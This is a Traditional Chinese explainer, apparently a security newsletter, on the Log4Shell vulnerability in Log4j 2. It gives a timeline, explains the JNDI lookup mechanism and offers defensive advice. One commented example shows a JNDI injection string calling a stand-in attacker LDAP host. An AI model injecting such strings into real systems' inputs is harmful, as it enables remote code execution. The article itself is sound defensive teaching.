Log4Shell：一行日誌如何讓伺服器聽命於人

  • CVE-2021-44228
  • 遠端程式碼執行
  • Java

本期三句話

  1. Log4j 2 會解析日誌內容中的 ${...}，可被誘導去載入遠端程式碼。
  2. 幾乎所有 Java 服務都用它記錄使用者輸入，影響面極廣。
  3. 升級到 Log4j 2.17.1 以上，並盤點系統裡藏著的舊版本。

深講：當「記錄」變成「執行」

先備概念

想像一位祕書負責把來電內容寫進記事本。某天有人在電話裡說：「請去 XX 地址拿一份指令，照著做。」結果祕書不只記下來，還真的去拿、真的照做了。

日誌（log）是程式運作時留下的紀錄，例如「使用者 alice 登入失敗」。為了方便，日誌函式庫常提供查找（lookup）功能：寫 ${java:version} 會自動換成 Java 版本號。問題在於，Log4j 2 連使用者輸入的內容也會做這種替換。

而 JNDI 是 Java 用來「依名字向外部服務查詢物件」的介面，它能透過 LDAP 等協定從遠端伺服器取得物件，甚至取得要載入的類別。兩者一結合，就出事了。

事件經過

  1. 2021-11-24阿里雲安全團隊研究員向 Apache 私下通報此漏洞。
  2. 2021-12-09漏洞細節在網路上公開，大規模掃描與攻擊隨即出現，業界稱之為 Log4Shell。
  3. 2021-12-10CVE-2021-44228 正式公開，CVSS 10.0，官方建議升級至修補版 2.15.0。
  4. 2021-12-14發現 2.15.0 修補不完整（CVE-2021-45046），2.16.0 預設停用 JNDI 並移除訊息查找。
  5. 2021-12 下旬陸續又修正兩個相關問題，最終建議版本為 2.17.1（Java 8 以上）。

技術機制

攻擊的關鍵只有一句：任何會被記錄的使用者輸入，都可能是指令。例如 HTTP 標頭、帳號欄位、聊天訊息。

// 很常見、看起來無害的程式碼
logger.info("Login failed for user: " + username);

// 若 username 是這樣的字串（示意，網址已無效化）：
//   ${jndi:ldap://attacker.example/x}
//
// 受影響的 Log4j 會：
// 1. 看到 ${jndi:...}，觸發 JNDI 查找
// 2. 連線到攻擊者控制的 LDAP 伺服器
// 3. 依回應去下載並載入攻擊者指定的 Java 類別
// 4. 類別在伺服器上執行 → 遠端程式碼執行（RCE）

攻擊者不需要帳號、不需要知道系統架構，只要找到一個「會被寫進日誌」的輸入欄位。這就是它被稱為近年最嚴重漏洞之一的原因。

防禦與啟示

立即可做

  • 將 log4j-core 升級到 2.17.1 以上（Java 8+）。
  • 用軟體組成分析工具掃描相依套件，舊版常藏在別的 jar 檔裡面。
  • 對外連線設白名單，伺服器不該主動連到任意 LDAP 位址。

長期該想

  • 使用者輸入應永遠被當成「資料」，而不是「指令」。
  • 維護軟體物料清單（SBOM），出事時才能快速回答「我們有沒有用到」。
  • 方便的功能預設開啟，常常就是攻擊面。

名詞小卡

日誌（log）
程式執行時留下的文字紀錄，用於除錯與稽核。
JNDI（Java Naming and Directory Interface）
Java 依名稱向外部目錄服務查詢資源的介面。
LDAP
一種目錄服務協定，常用於帳號管理，也可被 JNDI 用來取得遠端物件。
遠端程式碼執行（RCE, Remote Code Execution）
攻擊者能讓遠端主機執行自己指定的程式，屬最嚴重的漏洞類型之一。
SBOM（Software Bill of Materials）
軟體物料清單，列出軟體用到的所有元件與版本。
